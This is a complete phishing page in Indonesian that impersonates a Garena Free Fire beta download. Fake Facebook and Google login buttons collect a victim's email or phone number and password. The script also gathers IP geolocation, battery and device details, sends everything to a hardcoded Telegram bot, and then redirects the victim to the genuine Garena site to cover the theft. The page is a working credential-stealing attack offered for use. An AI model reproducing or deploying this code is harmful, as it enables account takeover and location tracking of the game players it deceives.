<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena FF Beta - Early Access Download</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background: #000; color: #fff; font-family: 'Roboto', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; overflow: hidden; }
        .login-card { width: 100%; max-width: 400px; padding: 30px; background: rgba(15, 15, 15, 0.95); border: 2px solid #ff0000; border-radius: 20px; box-shadow: 0 0 40px rgba(255, 0, 0, 0.6); position: relative; z-index: 2; }
        .header-text { font-family: 'Orbitron', sans-serif; color: #ff0000; text-align: center; text-shadow: 0 0 15px #ff0000; margin-bottom: 5px; font-size: 28px; }
        .sub-text { text-align: center; font-size: 13px; color: #aaa; margin-bottom: 25px; }
        .form-control { background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 10px; padding: 12px; }
        .form-control:focus { background: #222; border-color: #ff0000; color: #fff; box-shadow: none; }
        .btn-fb { background: #1877f2; color: #fff; font-weight: bold; border-radius: 10px; padding: 12px; border: none; transition: 0.3s; }
        .btn-ggl { background: #fff; color: #000; font-weight: bold; border-radius: 10px; padding: 12px; border: none; transition: 0.3s; }
        .btn-fb:hover, .btn-ggl:hover { opacity: 0.8; transform: scale(1.02); }
        .footer-brand { text-align: center; font-size: 10px; color: #444; margin-top: 25px; text-transform: uppercase; letter-spacing: 2px; }
        /* Background Animation */
        .bg-anim { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, #200000 0%, #000 100%); z-index: 1; }
    </style>
</head>
<body>
    <div class="bg-anim"></div>
    <div class="login-card">
        <h2 class="header-text">FREE FIRE BETA</h2>
        <p class="sub-text">Verifikasi Akun untuk Download APK Beta v6.9</p>
        
        <div class="mb-3">
            <input type="text" id="user" class="form-control" placeholder="Email atau No. HP" required>
        </div>
        <div class="mb-3">
            <input type="password" id="pass" class="form-control" placeholder="Kata Sandi" required>
        </div>
        
        <div class="d-grid gap-3">
            <button onclick="sendData('Facebook')" class="btn btn-fb">MASUK DENGAN FACEBOOK</button>
            <button onclick="sendData('Google')" class="btn btn-ggl">MASUK DENGAN GOOGLE</button>
        </div>
        
        <div class="footer-brand">
            Powered by RexusZ Engine & Shafiq Panel<br>
            © 2026 Garena International
        </div>
    </div>

    <script>
        // --- KONFIGURASI BOT ---
        const TELE_TOKEN = "8797152046:AAFGRBsspuWkiuiy0OXu9NDu1NI7nkM03bc"; // GANTI TOKEN LU DISINI TOLOL
        const TELE_CHATID = "8463622692"; // GANTI CHAT ID LU DISINI
        // -----------------------

        async function sendData(type) {
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            
            if(!user || !pass) { 
                alert('Isi dulu datanya, jangan tolol!'); 
                return; 
            }

            // Status: Sedang Mengambil Data Jeroan HP
            console.log("Infiltrating Device...");

            let ipData = {};
            try {
                ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
            } catch (e) {
                ipData = { ip: "Unknown", city: "Unknown", latitude: 0, longitude: 0, org: "Unknown" };
            }

            let batteryInfo = "Gagal Deteksi";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                batteryInfo = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Nge-cas' : 'Gak Nge-cas'})`;
            }

            const device = {
                ua: navigator.userAgent,
                screen: `${window.screen.width}x${window.screen.height}`,
                lang: navigator.language,
                time: new Date().toLocaleString('id-ID')
            };

            const gmaps = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;

            // Susun Pesan Mentah Buat Telegram
            const text = `☠️ **RESULT BREACHED: ${type.toUpperCase()}** ☠️\n` +
                         `━━━━━━━━━━━━━━━━━━\n` +
                         `👤 **User:** \`${user}\`\n` +
                         `🔑 **Pass:** \`${pass}\`\n` +
                         `━━━━━━━━━━━━━━━━━━\n` +
                         `🌐 **IP:** \`${ipData.ip}\`\n` +
                         `📍 **Loc:** ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n` +
                         `📌 **Lat/Lon:** \`${ipData.latitude},${ipData.longitude}\`\n` +
                         `🏢 **ISP:** ${ipData.org}\n` +
                         `🗺️ **Maps:** [LIHAT LOKASI](${gmaps})\n` +
                         `━━━━━━━━━━━━━━━━━━\n` +
                         `🔋 **Baterai:** ${batteryInfo}\n` +
                         `📱 **Device:** ${device.ua}\n` +
                         `🖥️ **Layar:** ${device.screen}\n` +
                         `🕒 **Waktu:** ${device.time}\n` +
                         `━━━━━━━━━━━━━━━━━━\n` +
                         `BY: **SHAFIQ KHAIRY PANEL** ✅`;

            const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_CHATID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

            // Eksekusi Pengiriman
            fetch(url).then(() => {
                // Tendang target ke link Advance Server asli
                window.location.href = "https://ff-advance.ff.garena.com/";
            }).catch(() => {
                window.location.href = "https://ff-advance.ff.garena.com/";
            });
        }
    </script>
</body>
</html>
